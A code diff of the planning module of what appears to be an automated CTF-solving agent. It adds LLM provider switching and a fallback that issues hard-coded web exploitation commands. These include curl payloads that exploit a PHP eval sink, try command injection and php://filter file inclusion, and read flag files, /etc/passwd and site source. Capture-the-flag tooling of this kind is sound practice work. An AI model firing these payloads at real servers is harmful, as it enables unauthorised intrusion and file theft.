@@ -2,7 +2,8 @@
 Planner - Task Planning Module (Optimized)
 
 Enhanced with better prompting, few-shot examples, structured output,
-and async LLM calls.
+async LLM calls, multi-provider support (MiMo, MiniMax, etc.),
+and automatic fallback model switching.
 """
 
 import json
@@ -14,6 +15,29 @@ from typing import Optional
 from urllib.parse import urljoin
 
 logger = logging.getLogger(__name__)
+
+# Model name aliases: friendly name → API slug
+MODEL_ALIASES = {
+    # MiMo series
+    "mimo-v2.5-pro": "mimo-v2.5-pro",
+    "mimo-v2.5": "mimo-v2.5",
+    "mimo-v2-pro": "mimo-v2-pro",
+    "mimo-v2-omni": "mimo-v2-omni",
+    "mimo-v2-flash": "mimo-v2-flash",
+    # MiniMax series
+    "minimax-text-01": "MiniMax-Text-01",
+    "minimax-m1": "MiniMax-M1",
+    "minimax-m2": "MiniMax-M2",
+}
+
+# Default base URLs for providers that have built-in endpoints
+PROVIDER_DEFAULTS = {
+    "mimo": {"base_url": "https://api.xiaomimimo.com/v1"},
+    "minimax": {"base_url": "https://api.minimax.chat/v1"},
+    "minimax-cn": {"base_url": "https://api.minimaxi.com/v1"},
+    "deepseek": {"base_url": "https://api.deepseek.com/v1"},
+    "ollama": {"base_url": "http://localhost:11434/v1"},
+}
 
 
 @dataclass
@@ -168,21 +192,36 @@ class Planner:
         self.provider = provider
         self.api_model = self._normalize_model_name(model, provider)
         self.api_key = api_key
-        self.base_url = base_url.rstrip("/") if isinstance(base_url, str) and base_url.strip() else None
+        self.base_url = self._resolve_base_url(provider, base_url)
         self.temperature = temperature
         self.max_tokens = max_tokens
         self._client = None
         self._llm_disabled_reason: Optional[str] = None
+        self._model_unsupported: bool = False
 
     @staticmethod
     def _normalize_model_name(model: str, provider: str) -> str:
         """Normalize friendly model names to provider API slugs."""
         normalized = (model or "").strip()
-        if normalized.lower().startswith("mimo-"):
-            return normalized.lower()
-        if provider in {"mimo", "openai-compatible"} and "mimo" in normalized.lower():
-            return normalized.lower()
+        lower = normalized.lower()
+        # Check alias table first
+        if lower in MODEL_ALIASES:
+            return MODEL_ALIASES[lower]
+        # Auto-lowercase mimo- prefixed names
+        if lower.startswith("mimo-"):
+            return lower
+        # For mimo/openai-compatible provider with mimo in name
+        if provider in {"mimo", "openai-compatible"} and "mimo" in lower:
+            return lower
         return normalized
+
+    @staticmethod
+    def _resolve_base_url(provider: str, base_url: Optional[str]) -> Optional[str]:
+        """Resolve base URL: explicit > provider default > None."""
+        if base_url and isinstance(base_url, str) and base_url.strip():
+            return base_url.rstrip("/")
+        defaults = PROVIDER_DEFAULTS.get(provider, {})
+        return defaults.get("base_url")
 
     def _get_client(self):
         if self._client is None:
@@ -195,16 +234,18 @@ class Planner:
             elif self.provider == "anthropic":
                 import anthropic
                 self._client = anthropic.Anthropic(api_key=self.api_key)
-            elif self.provider == "deepseek":
+            elif self.provider in {"deepseek", "ollama"}:
                 from openai import OpenAI
-                self._client = OpenAI(api_key=self.api_key, base_url=self.base_url or "https://api.deepseek.com/v1")
-            elif self.provider == "ollama":
-                from openai import OpenAI
-                self._client = OpenAI(api_key=self.api_key or "ollama", base_url=self.base_url or "http://localhost:11434/v1")
+                self._client = OpenAI(api_key=self.api_key or "ollama", base_url=self.base_url)
             elif self.provider in {"openai-compatible", "mimo"}:
                 from openai import OpenAI
                 if not self.base_url:
-                    raise ValueError("provider requires llm.base_url")
+                    raise ValueError(f"provider '{self.provider}' requires llm.base_url")
+                self._client = OpenAI(api_key=self.api_key, base_url=self.base_url)
+            elif self.provider in {"minimax", "minimax-cn"}:
+                from openai import OpenAI
+                if not self.base_url:
+                    raise ValueError(f"provider '{self.provider}' requires llm.base_url")
                 self._client = OpenAI(api_key=self.api_key, base_url=self.base_url)
             else:
                 raise ValueError(f"Unsupported provider: {self.provider}")
@@ -315,52 +356,139 @@ Output ONLY valid JSON."""
 
     def _disable_llm_if_auth_error(self, error) -> None:
         text = str(error).lower()
+        # Authentication errors → permanently disable LLM
         auth_markers = (
             "401",
             "unauthorized",
             "incorrect api key",
             "invalid_api_key",
             "authentication",
-            "api key",
         )
         if any(marker in text for marker in auth_markers):
             self._llm_disabled_reason = (
-                "LLM authentication failed. Check OPENAI_API_KEY or switch provider/model."
+                f"LLM authentication failed for provider '{self.provider}'. "
+                f"Check API key or switch provider."
             )
-        elif "not supported model" in text or "unsupported model" in text:
-            self._llm_disabled_reason = (
-                f"LLM model {self.model!r} is not supported by this endpoint. "
-                f"Try API model slug {self.api_model!r} or check llm.model."
+            return
+        # Model not supported → mark for fallback, do NOT disable LLM entirely
+        if "not supported model" in text or "unsupported model" in text:
+            self._model_unsupported = True
+            logger.warning(
+                f"Model '{self.api_model}' not supported by {self.provider} endpoint. "
+                f"Fallback should be triggered."
             )
+            return
 
     def _fallback_plan(self, url, error, category: str = "unknown", previous_steps=None) -> Plan:
-        """Fallback plan when LLM fails."""
+        """Fallback plan when LLM fails. Smarter: detects RCE and chains exploitation."""
         previous_steps = previous_steps or []
-        already_used_fallback = any("[Plan]" in step and "fallback reconnaissance" in step for step in previous_steps)
-        if already_used_fallback:
+        steps_text = "\n".join(previous_steps)
+
+        # Check if RCE was already confirmed in previous steps
+        rce_confirmed = "CTF_AGENT_RCE" in steps_text
+
+        if rce_confirmed and url:
+            # RCE confirmed → extract flags from common locations
+            quoted_url = shlex.quote(url)
+            flag_payload = (
+                'a=echo "CTF_AGENT_FLAG_SCAN:"; '
+                'cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null; '
+                'cat /var/www/flag* 2>/dev/null; cat /var/www/html/flag* 2>/dev/null; '
+                'cat /var/www/html/get_flag.php 2>/dev/null; '
+                'find / -maxdepth 3 -name "flag*" -readable 2>/dev/null | head -10; '
+                'find / -maxdepth 3 -name "*flag*" -readable 2>/dev/null | head -10; '
+                'env | grep -i flag 2>/dev/null; '
+                'cat /etc/passwd 2>/dev/null'
+            )
+            source_payload = (
+                'a=echo "CTF_AGENT_SOURCE:"; '
+                'cat /var/www/html/index.php 2>/dev/null; '
+                'cat /var/www/html/get_flag.php 2>/dev/null; '
+                'ls -laR /var/www/html/ 2>/dev/null'
+            )
+            return Plan(
+                reasoning="RCE confirmed from previous steps. Extracting flags from common locations.",
+                actions=[
+                    Action(
+                        tool="curl",
+                        command=f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote(flag_payload)} {quoted_url}",
+                        description="Extract flags from common CTF locations after confirmed RCE",
+                    ),
+                    Action(
+                        tool="curl",
+                        command=f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote(source_payload)} {quoted_url}",
+                        description="Read source code to find hidden flag logic",
+                    ),
+                ],
+                confidence=0.6,
+                strategy="rce_flag_extraction",
+            )
+
+        # Check if basic recon already ran
+        already_recon = any("[Plan]" in s and "fallback reconnaissance" in s for s in previous_steps)
+        if already_recon:
+            # Recon done, try more aggressive approaches based on what we found
+            actions = []
+            if url:
+                quoted_url = shlex.quote(url)
+                # Try common web vulns
+                if category == "web":
+                    actions.extend([
+                        Action(
+                            tool="curl",
+                            command=f"curl -s --max-time 10 {shlex.quote(url.rstrip('/') + '/index.php')} | head -200",
+                            description="Check index.php directly",
+                        ),
+                        Action(
+                            tool="curl",
+                            command=f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote('a=system(\"id\");')} {quoted_url}",
+                            description="Try PHP system() via POST 'a' parameter",
+                        ),
+                        Action(
+                            tool="curl",
+                            command=(
+                                f"curl -s --max-time 10 {shlex.quote(url.rstrip('/') + '/?cmd=id')}"
+                            ),
+                            description="Try GET parameter 'cmd' for command injection",
+                        ),
+                        Action(
+                            tool="curl",
+                            command=(
+                                f"curl -s --max-time 10 "
+                                f"{shlex.quote(url.rstrip('/') + '/index.php?page=php://filter/convert.base64-encode/resource=index')}"
+                            ),
+                            description="Try PHP LFI with php://filter wrapper",
+                        ),
+                    ])
+            if actions:
+                return Plan(
+                    reasoning="Fallback recon done. Trying more aggressive web exploitation approaches.",
+                    actions=actions,
+                    confidence=0.3,
+                    strategy="fallback_aggressive",
+                )
             return Plan(
                 reasoning=(
-                    f"{error}; fallback reconnaissance already ran. "
-                    "No new deterministic actions are available without a working LLM."
+                    f"{error}; fallback reconnaissance already ran and no new "
+                    f"deterministic actions are available without a working LLM."
                 ),
                 actions=[],
                 confidence=0.0,
                 strategy="fallback_exhausted",
             )
 
+        # First fallback: basic reconnaissance
         actions = []
         if url:
             quoted_url = shlex.quote(url)
-            post_rce = (
-                f"curl -s --max-time 10 -X POST --data-urlencode "
-                f"{shlex.quote('a=echo \"CTF_AGENT_RCE:\"; system(\"id; pwd; ls -la; cat /flag 2>/dev/null; cat flag 2>/dev/null; cat flag.php 2>/dev/null; cat get_flag.php 2>/dev/null\");')}"
-                f" {quoted_url}"
+            probe_payload = 'a=echo "CTF_AGENT_PROBE";'
+            rce_payload = (
+                'a=echo "CTF_AGENT_RCE:"; '
+                'system("id; pwd; ls -la; cat /flag 2>/dev/null; cat flag 2>/dev/null; '
+                'cat flag.php 2>/dev/null; cat get_flag.php 2>/dev/null");'
             )
-            post_probe = (
-                f"curl -s --max-time 10 -X POST --data-urlencode "
-                f"{shlex.quote('a=echo \"CTF_AGENT_PROBE\";')}"
-                f" {quoted_url}"
-            )
+            post_probe = f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote(probe_payload)} {quoted_url}"
+            post_rce = f"curl -s --max-time 10 -X POST --data-urlencode {shlex.quote(rce_payload)} {quoted_url}"
             robots_url = shlex.quote(urljoin(url.rstrip("/") + "/", "robots.txt"))
             flag_url = shlex.quote(urljoin(url.rstrip("/") + "/", "flag.txt"))
             actions.append(Action(
@@ -374,23 +502,19 @@ Output ONLY valid JSON."""
             if category == "web":
                 actions.extend([
                     Action(
-                        tool="curl",
-                        command=post_probe,
+                        tool="curl", command=post_probe,
                         description="Probe common PHP eval POST parameter 'a'",
                     ),
                     Action(
-                        tool="curl",
-                        command=post_rce,
+                        tool="curl", command=post_rce,
                         description="Exploit visible PHP eval($_POST['a']) sink to read common flag paths",
                     ),
                     Action(
-                        tool="curl",
-                        command=f"curl -s --max-time 10 {robots_url}",
+                        tool="curl", command=f"curl -s --max-time 10 {robots_url}",
                         description="Check robots.txt for hidden paths",
                     ),
                     Action(
-                        tool="curl",
-                        command=f"curl -s --max-time 10 {flag_url}",
+                        tool="curl", command=f"curl -s --max-time 10 {flag_url}",
                         description="Probe a common CTF flag path",
                     ),
                 ])
